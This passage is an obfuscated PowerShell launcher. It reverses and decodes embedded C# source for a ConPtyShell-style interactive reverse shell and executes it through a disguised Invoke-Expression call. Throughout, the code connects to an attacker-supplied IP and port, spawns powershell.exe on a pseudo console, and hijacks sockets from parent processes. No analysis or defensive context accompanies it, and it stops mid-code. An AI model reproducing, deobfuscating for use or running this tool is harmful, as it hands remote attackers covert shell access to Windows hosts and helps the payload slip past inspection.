 &((gET-vARIABLE '*mdR*').NaMe[3,11,2]-joIN'') ("$( sET-itEm 'vARIAbLE:ofS'  '' ) " +([STRINg] [ReGex]::matcHEs( ")''nioJ-'x'+]3,1[)(GNIRTsOT.EcnEreferPESObreV$ ( & |)69]rAhc[,)15]rAhc[+09]rAhc[+911]rAhc[( eCaLpeR-  421]rAhc[,'W3U'ECAlpeRC- 29]rAhc[,'q7J'eCaLpeR-  43]rAhc[,'YGK'  eCaLpeR-63]rAhc[,)511]rAhc[+021]rAhc[+96]rAhc[(eCaLpeR- 93]rAhc[,)58]rAhc[+011]rAhc[+47]rAhc[(eCaLpeR-  )'
;)@YGK

'+'}
}    
;))sgra(niaMllehSytPnoC.ssalCniaMllehSytPnoC(etirW.tuO.elosnoC        
{    
)sgra ][gnirts(niaM diov citats    
{
ssalCniaM ssalc


}
}    
;tuptuo nruter        
}        
}            
;)YGKnq7JYGK + )(gnirtSoT.e + YGKnq7JYGK(eniLetirW.elosnoC                
{            
)e noitpecxE( hctac            
}            
;)llehSedargpu ,eniLdnammoc ,sloc ,swor ,troPetomer ,pIetomer(llehSytPnoCnwapS.llehSytPnoC = tuptuo                
;)sgra(eniLdnammoCesraP = eniLdnammoc gnirts               '+' 
;)sgra(sloCesraP = sloc tniu                
;)sgra(swoResraP = swor tniu                
}                
;)]1[sgra(tnIkcehC = troPetomer                    
;)]0[sgra(grApIetomeRkcehC = pIetomer                    
{                
esle                
;eurt = llehSedargpu                    
))YGKedargpuYGK(sniatnoC.]0[sgra( fi                
;)sgra(sgrAkcehC                
{            
yrt            
;eslaf = llehSedargpu loob            
;0 = troPetomer tni            
;YGKYGK = pIetomer gnirts            
{        
esle        
}        
;)(pleHyalpsiD            
{        
))]0[sgra(deriuqeRpleH && 1 == htgneL.sgra( fi  '+'      
;YGKYGK = tuptuo gnirts        
{    
)sgra ][gnirts(niaMllehSytPnoC gnirts citats cilbup    

}    
;eniLdnammoc nruter        
;]4[stnemugra = eniLdnammoc            
)4 > htgneL.stnemugra( fi        
;YGKexe.llehsrewopYGK = eniLdnammoc gnirts        
{    
)stnemugra ][gnirts(eniLdnammoCesraP gnirts citats etavirp    

} '+'   
;sloc nruter        
;)]3[stnemugra(tnIkcehC)tniu( = sloc            
)3 > htgneL.stnemugra( fi        
;08 = sloc tniu        
{    
)stnemugra ][gnirts(sloCesraP tniu citats etavirp    

}    
;swor nruter        
;)]2[stnemugra(tnIkcehC)tniu( = swor            
)2 > htgneL.stnemugra( fi        
;42 = swor tniu        
{    
)stnemugra ][gnirts(swoResraP tniu citats etavirp    

}    
;ter nruter        
;)gra + YGK eulav regetni dilavnI :llehSytPnoCnq7Jrq7JYGK(noitpecxEllehSytPnoC wen worht            
))ter tuo ,gra(esraPyrT.23tnI!( fi        
;0 = ter tni        
{    
)gra gnirts(tnIkcehC tni citats etavirp    

}    
;gnirtSpi nruter        
;)gnirtSpi + YGKeulav pIetomer dilavnI :llehSytPnoCnq7Jrq7JYGK(noitpecxEllehSytPnoC wen worht            
))sserdda tuo ,gnirtSpi(esraPyrT.sserddAPI!( fi        
;sserdda sserddAPI        
{    
)gnirtSpi gnirts(grApIetomeRkcehC gnirts citats etavirp    

}    
;)pleh(etirW.tuO.elosnoC        
{    
)(pleHyalpsiD diov citats etavirp    

}    
;)YGKnq7Jrq7J.pleh lanoitidda rof pleh-- esU .deriuqer stnemugrA 2 .stnemugra hguone toN :llehSytPnoCnq7Jrq7JYGK(noitpecxEllehSytPnoC wen worht            
)2 < htgneL.stnemugra( fi        
{    
)stnemugra ][gnirts(sgrAkcehC diov citats etavirp    

}    
;YGK?/YGK == marap W3UW3U YGKpleh--YGK == marap W3UW3U YGKh-YGK == marap nruter        
{    
)marap gnirts(deriuqeRpleH loob citats etavirp    

;YGKYGK@ = pleh gnirts citats etavirp    
{
ssalCniaMllehSytPnoC ssalc citats cilbup

}
}    
;tuptuo nruter        
;YGKnq7Jrq7J.detixe yldnik llehSytPnoCYGK =+ tuptuo        
;)daeRepiPtuptuO(eldnaHesolC )oreZ.rtPtnI =! daeRepiPtuptuO( fi        
;)etirWepiPtupn'+'I(eldnaHesolC )oreZ.rtPtnI =! etirWepiPtupnI( fi        
;)elosnoCoduesPeldnah(elosnoCoduesPesolC )oreZ.rtPtnI =! elosnoCoduesPeldnah( fi        
;)ssecorPh.ofnIssecorPdlihc(eldnaHesolC        
;)daerhTh.ofnIssecorPdlihc(eldnaHesolC        
;)(elosnoCeerF            
)detacollAelosnoCwen( fi        
;)rrEdtSdlo ,tuOdtSdlo ,nIdtSdlo(seldnaHdt'+'SerotseR        
;)tekcoSllehs(tekcosesolc        
}        
;)eldnaH.ssecorPtneraPdnarg(ssecorPemuseRtN )detirehnItekcoStneraPdnarg( fi            
;)eldnaH.ssecorPtnerap(ssecorPemuseRtN )detirehnItekcoStnerap( fi            
}            
;)0 ,tekcoSllehs(edoMgnikcolBtekcoSteS.gnikcajiHtekcoS                
;)0 ,oreZ.rtPtnI ,tekcoSllehs(tceleStnevEASW                
tekcos eht rof noitceles tneve eht gnillecnac //                
{            
)deppalrevOtekcoSsI!( fi            
{        
)llehSedargpu( fi       '+' 
;)(trobA.epiPetirWtekcoSdaeRht        
;)(trobA.tekcoSetirWepiPdaeRdaerhTht        
gnihtyreve punaelc//        
;)ETINIFNI ,ssecorPh.ofnIssecorPdlihc(tcejbOelgniSroFtiaW        
tixe litnu ssecorp dlihc eht rof tiaw //        
;)deppalrevOtekcoSsI ,ssecorPh.ofnIssecorPdlihc ,tekcoSllehs ,etirWepiPtupnI(epiPetirWtekcoSdaeRdaerhTtratS = epiPetirWtekcoSdaeRht daerhT        
;)deppalrevOtekcoSsI ,tekcoSllehs ,daeRepiPtuptuO(tekcoSetirWepiPdaeRdaerhTtratS = tekcoSetirWepiPdaeRdaerhTht daerhT        
sksaT naht ecnamrofrep retteb evah sdaerhT//        
}        
;)1 ,tekcoSllehs(edoMgnikcolBtekcoSteS.gnikcajiHtekcoS )deppalrevOtekcoSsI!( fi            
;)eldnaH.ssecorPtneraPdnarg(ssecorPdnepsuStN )detirehnItekcoStneraPdnarg( fi            
;)eldnaH.ssecorPtnerap(ssecorPdnepsuStN )detirehnItekcoStnerap( fi            
ssecorp ytpnoc ruo yb ylno etirw/daer si rredts dna tuodts ,nidts erusne lliw sihT .yna fi stekcos detacilpud eht htiw tcaretni nac taht sessecorp rehto dnepsus ot deen ew //            
{ )llehSedargpu( fi        
;)etirWepiPtuptuO(eldnaHesolC )oreZ.rtPtnI =! etirWepiPtuptuO( fi        
;)daeRepiPtupnI(eldnaHesolC )oreZ.rtPtnI =! daeRepiPtupnI( fi        
.deyortsed si YTPnoC eht nehw //        
desaeler eb lliw dna tsoHnoC eht otni deUnJpud era seldnah eht esuaceb //        
ereh sepip eht fo dne-YTP eht ot seldnah eht esolc nac eW :etoN //        
}        
;)ofnIssecorPdlihc tuo ,ofnIs fer ,llun ,oreZ.rtPtnI ,0 ,eurt ,oreZ.rtPtnI ,oreZ.rtPtnI ,eniLdnammoc ,llun(ssecorPetaerC            
;etirWepiPtuptuO = rorrEdtSh.ofnIs            
;etirWepiPtuptuO = tuptuOdtSh.ofnIs            
;daeRepiPtupnI = tupnIdtSh.ofnIs            
;SELDNAHDTSESU_FTRATS)23tnI( =W3U sgalFwd.ofnIs            
;)ofnIs(fOeziS.lahsraM = bc.ofnIs            
;)(OFNIPUTRATS wen = ofnIs OFNIPUTRATS            
;)YGKnq7Jrq7J...llehs evitcaretni ekil-tacten a gninwapS !dnuof ton noitcnuf elosnoCoduesPetaerCnq7Jrq7JYGK(eniLetirW.elosnoC            
}            
;tuptuo nruter                
;))(gnirtSoT.troPetomer ,pIetomer ,gnir'+'tSrorre ,YGK}2{ trop no }1{ pi ot tcennoc ton dluoC}0{YGK(tamroF.gnirts =+ tuptuo                
{            
)oreZ.rtPtnI == tekcoSllehs( fi            
;)troPetomer ,pIetomer(etomeRtcennoc = tekcoSllehs            
}            
;tuptuo nruter               '+' 
;)YGKmetsys siht no elbitapmoc ton si YTPnoC esuaceb evitcaretni ylluf ot llehs edargpu ton dluoCYGK(tamroF.gnirts =+ tuptuo                
{            
)llehSedargpu( fi            
{        
esle        
}        
;)eniLdnammoc ,elosnoCoduesPeldnah(elosnoCoduesPhtiWssecorPdlihCetaerC = ofnIssecorPdlihc            
}            
;tuptuo nruter                
;))(gnirtSoT.tluseRnoitaerCelosnoCoduesp ,gnirtSrorre ,YGK}1{ edoC rorrE .elosnoc odeusp etaerc ton dluoC}0{YGK(tamroF.gnirts =+ tuptuo                
{            
)0 =! tluseRnoitaerCelosnoCoduesp( fi            
;)sloc ,swor ,etirWepiPtuptuO fer ,daeRepiPtupnI fer ,elosnoCoduesPeldnah fer(sepiPhtiWelosnoCoduesPetaerC = tluseRnoitaerCelosnoCoduesp tni            
;YGKYGK nruter //            
;)000081(peelS.daerhT //            
;)YGK...elosnoc oduesp gnitaerC :gubedYGK(eniLetirW.elosnoC //            
noitacilpud eldnah gnikcehc rof edoc gubed //            
}            
;eurt = detacollAelosnoCwen                
;)EDIH_WS ,)(wodniWelosnoCteG(wodniWwohS                
;)(elosnoCcollA                
{            
)oreZ.rtPtnI == )(wodniWelosnoCteG( fi            
}            
;)sloc fer ,swor fer ,tekcoSllehs(tekcoSmorFsloCswoResraPyrT                
}                
;tuptuo nruter                    
;))(gnirtSoT.troPetomer ,pIetomer ,gnirtSrorre ,YGK}2{ trop no }1{ pi ot tcennoc ton dluoC}0{YGK(tamroF.gnirts =+ tuptuo                    
{                
)oreZ.rtPtnI == tekcoSllehs( fi                
;)troPetomer ,pIetomer(etomeRtcennoc = tekcoSllehs                
{            
esle            
}            
}                
;)ssecorPtneraPdnarg ,tekcoSllehs(detirehnItekcoSsI.gnikcajiHtekcoS = detirehnItekcoStneraPdnarg )llun =! ssecorPtneraPdnarg( fi                    
;)ssecorPtnerap ,tekcoSllehs(detirehnItekcoSsI.gnikcajiHtekcoS = detirehnItekcoStnerap )llun =! ssecorPtnerap( fi                    
tekcos eht esu stnerap eht fi ees sUnJtel ,tekcos elbasu a tog ssecorp tnerruc eht //                    
{                
esle                
}                
}                    
;)ssecorPtneraPdnarg ,tekcoSllehs(detirehnItekcoSsI.gnikcajiHtekcoS = detirehnItekcoStneraPdnarg )llun =! ssecorPtneraPdnarg( fi                        
;eurt = detirehnItekcoStnerap                        
tekcos eht esu osla tneraPdnarg eht fi ees sUnJtel ,ssecorp tnerap eht morf tekcos elbasu a ahctog //                        
{                    
esle                    
}                    
}                        
;eurt = detirehnItekcoStneraPdnarg                            
{                        
esle                        
}                        
;)YGK.deliaf noitacilpud tekcoS .dnuof stcejbo dfAq7Jq7JeciveDq7Jq7J oNYGK(noitpecxEllehSytPnoC wen worht                            
{                        
)oreZ.rtPtnI =='+' tekcoSllehs( fi                        
;)deppalrevOtekcoSsI fer ,ssecorPtneraPdnarg(tekcoSssecorPtegraTetacilpuD.gnikcajiHtekcoS = tekcoSllehs                        
ssecorp tnerapdnarg eht ni tpmetta etarepsed tsal a yrt sUnJtel ,stekcos elbasu on sah ssecorp tnerap eht neve ,nmad //                        
{                    
)llun =! ssecorPtneraPdnarg && oreZ.rtPtnI == tekcoSllehs( fi                    
;)deppalrevOtekcoSsI fer ,ssecorPtnerap(tekcoSssecorPtegraTetacilpuD.gnikcajiHtekcoS = tekcoSllehs                    
tekcos ssecorp tnerap tnerruc ruo kcajih ot yrt ew ssecorp tnerruc eht ni dnuof era stekcos on fi //                    
{                
)llun =! ssecorPtnerap && oreZ.rtPtnI == tekcoSllehs( fi                
;)deppalrevOtekcoSsI'+' fer ,ssecorPtnerruc(tekcoSssecorPtegraTetac'+'ilpuD.gnikcajiHtekcoS = tekcoSllehs                
ssecorp tnerruc eht rof tekcos eht etacilpud ot yrt //                
;)eldnaH.ssecorPtnerap(ssecorPtneraPteG.seitilitUssecorPtneraP = ssecorPtneraPdnarg )llun =! ssecorPtnerap( fi                
;)eldnaH.ssecorPtnerruc(ssecorPtneraPteG.seitilitUssecorPtneraP = ssecorPtnerap                
;)(ssecorPtnerruCteG.ssecorP = ssecorPtnerruc                
;)(>rtPtnI<tsiL wen = seldnaHstekcos >rtPtnI<tsiL                
{            
)llehSedargpu( fi            
;)YGKnq7Jrq7Jllehs evitcaretni ylluf a gninwapS !dnuof noitcnuf elosnoCoduesPetaerCnq7Jrq7JYGK(eniLetirW.elosnoC            
{        
)elbitapmoCytpnoc( fi        
;)(daerhTASWtinI        
daerht siht rof ffuts pu'+'tratsasw tini //        
;)rrEdtSdlo fer ,tuOdtSdlo fer ,nIdtSdlo fer(elosnoCtinI        
srorre gubed ot noitcnuf woleb eht tnemmoc //        
;)etirWepiPtuptuO fer ,daeRepiPtuptuO fer ,etirWepiPtupnI fer ,daeRepiPtupnI fer(sepiPetaerC        
;)(NOITAMROFNI_SSECORP wen = ofnIssecorPdlihc NOITAMROFNI_SSECORP        
;eurt = elbitapmoCytpnoc            
)oreZ.rtPtnI =! )YGKelosnoCoduesPetaerCYGK ,)YGK23lenrekYGK(eldnaHeludoMteG(sserddAcorPteG( fi        
;llun = ssecorPtneraPdnarg ssecorP        
;llun = ssecorPtnerap ssecorP        
;llun = ssecorPtnerruc ssecorP        
;YGKYGK = tuptuo gnirts        
;eurt = deppalrevOtekcoSsI loob        
;eslaf = elbitapmoCytpnoc loob        
;eslaf = detirehnItekcoStneraPdnarg loob        
;eslaf = detirehnItekcoStnerap loob        
;eslaf = detacollAelosnoCwen loob        
;oreZ.rtPtnI = rrEdtSdlo rtPtnI        
;oreZ.rtPtnI = tuOdtSdlo rtPtnI        
;oreZ.rtPtnI = nIdtSdlo rtPtnI        
;oreZ.rtPtnI = elosnoCoduesPeldnah rtPtnI        
;oreZ.rtPtnI = etirWepiPtuptuO rtPtnI        
;oreZ.rtPtnI = daeRepiPtuptuO rtPtnI        
;oreZ.rtPtnI = etirWepiPtupnI rtPtnI        
;oreZ.rtPtnI = daeRepiPtupnI rtPtnI        
;oreZ.rtPtnI = tekcoSllehs rtPtnI        
{    
)llehSedargpu loob ,eniLdnammoc gnirts ,sloc tniu ,swor tniu ,troPetomer tni ,pIetomer gnirts(llehSytPnoCnwapS gnirts citats cilbup    

}    
;epiPetirWtekcoSdaeRht nruter        
;)sretemaraPdaerht(tratS.epiPetirWtekcoSdaeRht        
;)deppalrevOnoNepiPetirWtekcoSdaeRdaerhT(daerhT wen = epiPetirWtekcoSdaeRht            
esle        
;)deppalrevOepiPetirWtekcoSdaeRdaerhT(daerhT wen = epiPetirWtekcoSdaeRht            
)tekcoSdeppalrevo(fi        
;epiPetirWtekcoSdaeRht d'+'aerhT        
;ssecorPdlihCh = ]2[sretemaraPdaerht        
;tekcoSllehs = ]1[sretemaraPdaerht        
;etirWepiPtupnI = ]0[sretemaraPdaerht        
;]3[tcejbo wen = sretemaraPdaerht ][tcejbo        
{    
)tekcoSdeppalrevo loob ,ssecorPdlihCh rtPtnI ,tekcoSllehs rtPtnI ,etirWepiPtupnI rtPtnI(epiPetirWtekcoSdaeRdaerhTtratS daerhT citats etavirp    

}    
;)0 ,ssecorPdlihCh(ssecorPetanimreT        
;)tnevEdaeRasw(tnevEesolCASW        
;))sseccuSetirw && 0 > devieceRsetyBn( W3UW3U noitarepOgnikcolBtekcos( elihw }        
;))(rorrE23niWtsaLteG.lahsraM + YGK = )(rorrE23niWtsaLteG.lahsraM YGK + nettirWsetyb + YGK = nettirWsetyb :eliFetirW epiPetirWtekcoSdaeRdaerhT gubedYGK(eniLetirW.elosnoC //            
;)oreZ.rtPtnI ,nettirWsetyb tuo ,devieceRsetyBn)tniu( ,devieceRsetyb ,etirWepiPtupnI(eliFetirW = sseccuSetirw            
;))(gnirtSoT.)(rorrEtsaLteGASW + YGK = )(rorrEtsaLteGASW YGK + devieceRsetyBn + YGK = devieceRsetyBn :vcer epiPetirWtekcoSdaeRdaerhT :gubedYGK(eniLetirW.elosnoC //            
;eslaf = noitarepOgnikcolBtekcos            
;)tnevEdaeRasw(tnevEteseRASW            
}            
;eunitnoc                
;eurt = noitarepOgnikcolBtekcos                
{            
)KCOLBDLUOWEASW == )(rorrEtsaLteGASW( fi            
noitatnemelpmi tsubor erom a rof KCOLBDLUOWEASW kcehc llits ew //            
;)0 ,eziSreffub ,devieceRsetyb ,tekcoSllehs(vcer = devieceRsetyBn            
;)eslaf ,005 ,eurt ,yarrAstnevEasw ,htgneL.yarrAstnevEasw(stnevEelpitluMroFtiaWASW            
;]eziSreffub[etyb wen = devieceRsetyb ][etyb            
{        
od        
;} tnevEdaeRasw { ][rtPtnI wen = yarrAstnevEasw ][rtPtnI '+'       
;)DAER_DF ,tnevEdaeRasw ,tekcoSllehs(tceleStnevEASW        
atad emos teg ot ydaer si noitarepo vcer eht nehw delangis eb ot tneve hcnysa na etaerc ew .tniop siht ta gnikcolb-non eb ot tekcos eht tcepxe ew //        
;)(tnevEetaerCASW = tnevEdaeRasw rtPtnI        
;eslaf = noitarepOgnikcolBtekcos loob        
;0 = nettirWsetyb tniu        
;0 = devieceRsetyBn 23tnI        
;eslaf = sseccuSetirw loob        
;2918 = eziSreffub tni        
;]2[sre'+'temaraPdaerht)rtPtnI( = ssecorPdlihCh rtPtnI        
;]1[sretemaraPdaerht)rtPtnI( = tekcoSllehs rtPtnI        
;]0[sretemaraPdaerht)rtPtnI( = etirWepiPtupnI rtPtnI        
;smaraPdaerht)][tcejbo( = sretemaraPdaerht ][tcejbo        
{    
)smaraPdaerht tcejbo(deppalrevOnoNepiPetirWtekcoSdaeRdaerhT diov citats etavirp    

}    
;)0 ,ssecorPdlihCh(ssecorPetanimreT        
;))(gnirtSoT.)(rorrEtsaLteGASW + YGK = )(rorrEtsaLteGASW YGK + devieceRsetyBn + YGK = devieceRsetyBn :gubedYGK(eniLetirW.elosnoC  //        
;)sseccuSetirw && 0 > devieceRsetyBn( elihw }        
;)oreZ.rtPtnI ,nettirWsetyb tuo ,devieceRsetyBn)tniu( ,devieceRsetyb ,etirWepiPtupnI(eliFetirW = sseccuSetirw            
;)0 ,eziSreffub ,devieceRsetyb ,tekcoSllehs(vcer = devieceRsetyBn            
;]eziSreffub[etyb wen = devieceRsetyb ][etyb            
{        
od        
;0 = nettirWsetyb tniu        
;0 = devieceRsetyBn 23tnI      '+'  
;eslaf = sseccuSetirw loob        
;2918 = eziSreffub tni        
;]2[sretemaraPdaerht)rtPtnI( = ssecorPdlihCh rtPtnI        
;]1[sretemaraPdaerht)rtPtnI( = tekcoSllehs rtPtnI        
;]0[sretemaraPdaerht)rtPtnI( = etirWepiPtupnI rtPtnI        
;smaraPdaerht)][tcejbo( = sretemaraPdaerht ][tcejbo        
{    
)smaraPdaer'+'ht tcejbo(deppalrevOepiPetirWtekcoSdaeRdaerhT diov citats etavirp    

}    
;tekcoSetirWepiPdaeRdaerhTht nruter        
;)sretemaraPdaerht(tratS.tekcoSetirWepiPdaeRdaerhTht        
;)deppalrevOnoNtekcoSetirWepiPdaeRdaerhT(daerhT wen = tekcoSetirWepiPdaeRdaerhTht            
esle        
;)deppalrevOtekcoSetirWepiPdaeRdaerhT(daerhT wen = tekcoSetirWepiPdaeR'+'daerhTht            
)tekcoSdeppalrevo(fi        
;tekcoSetirWepiPdaeRdaerhTht daerhT        
;tekcoSllehs = ]1[sretemaraPdaerht        
;daeRepiPtuptuO = ]0[sretemaraPdaerht        
;]2[tcejbo wen = sretemaraPdaerht ][tcejbo        
{    
)tekcoSdeppalrevo loob ,tekcoSllehs rtPtnI ,daeRepiPtuptuO rtPtnI(tekcoSetirWepiPdaeRdaerhTtratS daerhT citats etavirp    

}    
;)sseccuSdaer && 0 > tneSsetyb( elihw }        
;)KCOLBDLUOWEASW == )(rorrEtsaLteGASW( elihw }            
;))(gnirtSoT.)(rorrEtsaLteGASW + YGK = )(rorrEtsaLteGASW YGK + tneSsetyb + YGK = tneSsetyb :dnes tekcoSetirWepiPdaeRdaerhT gubedYGK(eniLetirW.elosnoC //                
;)0 ,daeRsetyBwd)tni( ,etirWoTsetyb ,tekcoSllehs(dnes = tneSsetyb                
{            
od            
;))(rorrE23niWtsaLteG.lahsraM + YGK )(rorrE23niWtsaLteG.lahsraM YGK + daeRsetyBwd + YGK = daeRsetyBw'+'d :eliFdaeR tekcoSetirWepiPdaeRdaerhT gubedYGK(eniLetirW.elosnoC //            
;)oreZ.rtPtnI ,daeRsetyBwd tuo ,eziSreffub)tniu( ,etirWoTsetyb ,daeRepiPtuptuO(eliFdaeR = sseccuSdaer            
;]eziSreffub[etyb wen = etirWoTsetyb ][etyb            
{        
od        
;0 = daeRsetyBwd tniu        
;0 = tneSsetyb 23tnI        
;eslaf = sseccuSdaer loob        
;2918 = eziSreffub tni        
;'+']1[sr'+'etemaraPdaerht)rtPtnI( = tekcoSllehs rtPtnI        
;]0[sretemaraPdaerht)rtPtnI( = daeRepiPtuptuO rtPtnI        
;smaraPdaerht)][tcejbo( = sretemaraPdaerht ][tcejbo        
{    
)smaraPdaerht tcejbo(deppalrevOnoNtekcoSetirWepiPdaeRdaerhT diov citats etavirp    

}    
;))(gnirtSoT.)(rorrEtsaLteGASW + YGK = )(rorrEtsaLteGASW YGK + tneSsetyb + YGK = tneSsetyb :gubedYGK(eniLetirW.elosnoC //        
;)sseccuSdaer && 0 > tneSsetyb( elihw }        
;)0 ,daeRsetyBwd)tni( ,etirWoTsetyb ,tekcoSllehs(dnes = tneSsetyb            
;)oreZ.rtPtnI ,daeRsetyBwd tuo ,eziSreffub)tniu( ,etirWoTsetyb ,daeRepiPtuptuO(eliFdaeR = sseccuSdaer            
;]eziSreffub[etyb wen = etirWoTsetyb ][etyb            
{        
od        
;0 = daeRsetyBwd tniu        
;0 = tneSsetyb 23tnI        
;eslaf = sseccuSdaer loob        
;2918 = eziSreffub tni        
;]1[sretemaraPdaerht)rtPtnI( = tekcoSllehs rtPtnI        
;]0[sretemaraPdaerht)rtPtnI( = daeRepiPtuptuO rtPtnI        
;smaraPdaerht)][tcejbo( = sretemaraPdaerht ][tcejbo        
{    
)smaraPdaerht tcejbo(deppalrevOtekcoSetirWepiPdaeRdaerhT diov citats etavirp    

}    
;ofnIssecorp nruter        
;)eniLdnammoc ,ofnIputrats fer(ssecorPnuR = ofnIssecorp NOITAMROFNI_SSECORP        
;)ELOSNOCODUESP_ETUBIRTTA_DAERHT_CORP)rtPtnI( ,elosnoCoduesPeldnah(daerhTssecorPerugifnoC = ofnIputrats XEOFNIPUTRATS        
{    
)eniLdnammoc gnirts ,elosnoCoduesPeldnah rtPtnI(elosnoCoduesPhtiWssecorPdlihCetaerC NOITAMROFNI_SSECORP citats etavirp    

}    
;ofnIp nruter        
}        
;))(rorrE23niWtsaLteG.lahsraM + YGK .ssecorp etaerc ton dluoCYGK(noitpecxEllehSytPnoC wen worht            
{        
)sseccus!( fi        
;)ofnIp tuo ,xEofnIs fer ,llun ,oreZ.rtPtnI ,TNESERP_OFNIPUTRATS_DEDNETXE ,eslaf ,ceSt fer ,ceSp fer ,eniLdnammoc ,llun(xEssecorPetaerC = sseccus loob        
;eziSetubirttAytiruces = htgneLn.ceSt        
;)(SETUBIRTTA_YTIRUCES wen = ceSt SETUBIRTTA_YTIRUCES        
;eziSetubirttAytiruces = htgneLn.ceSp        
;)ceSp(fOeziS.lahsraM = eziSetubirttAytiruces tni        
;)(SETUBIRTTA_YTIRUCES wen = ceSp SETUBIRTTA_YTIRUCES        
;)(NOITAMROFNI_SSECORP wen = ofnIp NOITAMROFNI_SSECORP        
{    
)eniLdnammoc gnirts ,x'+'EofnIs XEOFNIPUTRATS fer(ssecorPnuR NOITAMROFNI_SSECORP citats etavirp    

}    
;ofnIputrats nruter        
}        
;))(rorrE23niWtsaLteG.lahsraM + YGK .etubirtta daerht elosnocoduesp tes ton dluoCYGK(noitpecxEllehSytPnoC wen worht            
{        
)sseccu'+'s!( fi        
;)oreZ.rtPtnI ,oreZ.rtPtnI ,eziS.rtPtnI)rtPtnI( ,elosnoCoduesPeldnah ,setubirtta ,0 ,tsiLetubirttApl.ofnIputrats(etubirttAdaerhTcorPetadpU = sseccus        
}        
;))(rorrE23niWtsaLteG.lahsraM + YGK .tsil etubirtta pu tes ton dluoCYGK(noitpecxEllehSytPnoC wen worht            
{        
)sseccus!( fi        
;)eziSpl fer ,0 ,1 ,tsiLetubirttApl.ofnIputrats(tsiLetub'+'irttAdaerhTcorPezilaitinI = sseccus        
;)eziSpl(labolGHcollA.lahsraM = tsiLetubirttApl.ofnIputrats        
;)ofnIputrats(fOeziS.lahsraM = bc.ofnIputratS.ofnIputrats        
;)(XEOFNIPUTRATS wen = ofnIputrats XEOFNIPUTRATS        
}        
;))(rorrE23niWtsaLteG.lahsraM + YGK .tsil etubirtta eht rof setyb fo rebmun eht etaluclac ton dluoCYGK(noitpecxEllehSytPnoC wen worht            
{        
)oreZ.rtPtnI == eziSpl W3UW3U sseccus( fi        
;)eziSpl fer ,0 ,1 ,oreZ.rtPtnI(tsiLetubirttAdaerhTcorPezilaitinI = sseccus loob        
;oreZ.rtPtnI = eziSpl rtPtnI        
{    
)setubirtta rtPtnI ,elosnoCoduesPeldnah rtPtnI(daerhTssecorPerugifnoC XEOFNIPUTRATS citats etavirp    

}    
;tluser nruter        
;)elosnoCoduesPeldnah tuo ,0 ,etirWepiPtuptuOytPnoC ,daeRepiPtupnIytPnoC ,drooCelosnoc(elosnoCoduesPetaerC = tluser        
;swor)trohs( = Y.drooCelosnoc        
;sloc)trohs( = X.drooCelosnoc        
;)(DROOC wen = drooCelosnoc DROOC        
;)(gnissecorPecneuqeSlanimreTlautriVelbanE        
;1- = tluser tni        
{    
)sloc tniu ,swor tniu ,etirWepiPtuptuOytPnoC rtPtnI fer ,daeRepiPtupnIytPnoC rtPtnI fer ,'+'elosnoCoduesPeldnah rtPtnI fer(sepiPhtiWelosnoCoduesPetaerC tni citats etavirp    

}    
}        
;)YGKgnissecorp lanimret lautriv elbane ton dluoCYGK(noitpecxEllehSytPnoC wen worht            
{        
))edoMelosnoCtuo ,tuOdtSh(edoMelosnoCteS!( fi        
;NRUTER_OTUA_ENILWEN_ELBASID W3U GNISSECORP_LANIMRET_LAUTRIV_ELBANE =W3U edoMelosnoCtuo        
}        
;)YGKedom elosnoc teg ton dluoCYGK(noitpecxEllehSytPnoC wen worht            
{        
))edoMelosnoCtuo tuo ,tuOdtSh(edoMelosnoCteG!( fi        
;)ELDNAH_TUPTUO_DTS(eldnaHdtSteG = tuOdtSh rtPtnI        
;0 = edoMelosnoCtuo tniu        
{    
)(gnissecorPecneuqeSlanimreTlautriVelbanE diov citats etavirp    

}    
;)nIdtSdlo ,ELDNAH_TUPNI_DTS(eldnaHdtSteS        
;)rrEdtSdlo ,ELDNAH_RORRE_DTS(eldnaHdtSteS        
;)tuOdtSdlo ,ELDNAH_TUPTUO_DTS(eldnaHdtSteS        
{    
)rrEdtSdlo rtPtnI ,tuOdtSdlo rtPtnI ,nIdtSdlo rtPtnI(seldnaHdtSerotseR diov citats etavirp    

}    
;)nidtSh ,ELDNAH_TUPNI_DTS(eldnaHdtSteS        
;)tuodtSh ,ELDNAH_RORRE_DTS(eldnaHdtSteS        
;)tuodtSh ,ELDNAH_TUPTUO_DTS(eldnaHdtSteS        
;)oreZ.rtPtnI ,LAMRON_ETUBIRTTA_ELIF ,GNITSIXE_NEPO ,oreZ.rtPtnI ,ETIRW_ERAHS_ELIF W3U DAER_ERAHS_ELIF ,ETIRW_CIRENEG W3U DAER_CIRENEG ,YGKsxENINOCYGK(eliFetaerC = nidtSh rtPtnI        
;)oreZ.rtPtnI ,LAMRON_ETUBIRTTA_ELIF ,GNITSIXE_NEPO ,oreZ.rtPtnI ,ETIRW_ERAHS_ELIF W3U DAER_ERAHS_ELIF ,ETIRW_CIRENEG W3U DAER_CIRENEG ,YGKsxETUONOCYGK(eliFetaerC = tuodtSh rtPtnI        
;)ELDNAH_RORRE_DT'+'S(eldnaHdtSteG = rrEdtSdlo        
;)ELDNAH_TUPTUO_DTS(eldnaHdtSteG = tuOdtSdlo        
;)ELDNAH_TUPNI_DTS(eldnaHdtSteG = nIdtSdlo        
{    
)rrEdtSdlo rtPtnI fer ,tuOdtSdlo rtPtnI fer ,nIdtSdlo rtPtnI fer(elosnoCtinI diov citats etavirp    

}    
;)YGKepiPtuptuO eht etaerc ton dluoCYGK(noitpecxEllehSytPnoC wen worht            
))EPIP_EZIS_REFFUB ,ceSp fer ,etirWepiPtuptuO tuo ,daeRepiPtuptuO tuo(epiPetaerC!( fi        
;)YGKepiPtupnI e'+'ht etaerc ton dluoCYGK(noitpecxEllehSytPnoC wen worht            
))EPIP_EZIS_REFFUB ,ceSp fer ,etirWepiPtupnI tuo ,daeRepiPtupnI tuo(epiPetaerC!( fi        
;oreZ.rtPtnI = rotpircseDytiruceSpl.ceSp        
;1 = eldnaHtirehnIb'+'.ceSp        
;)ceSp(fOeziS.lahsraM = htgneLn.ceSp        
;)(SETUBIRTTA_YTIRUCES wen = ceSp SETUBIRTTA_YTIRUCES        
{    
)etirWepiPtuptuO rtPtnI fer ,daeRepiPtuptuO rtPtnI fer ,etirWepiPtupnI'+' rtPtnI fer ,daeRepiPtupnI rtPtnI fer(sepiPetaerC diov citats etavirp    

}    
}        
;nruter            
{        
hctac        
}        
}            
;pmeTsloc)tniu( = sloc                
;pmeTswor)tniu( = swor                
{            
))pmeTsloc tuo ,gnirtSsloc(esraPyrT.23tnI && )pmeTswor tuo ,gnirtSswor(esraPyrT.23tnI( fi            
;)(mirT.]1[)UnJ UnJ(tilpS.devieceRezis = gnirtSsloc gnirts            
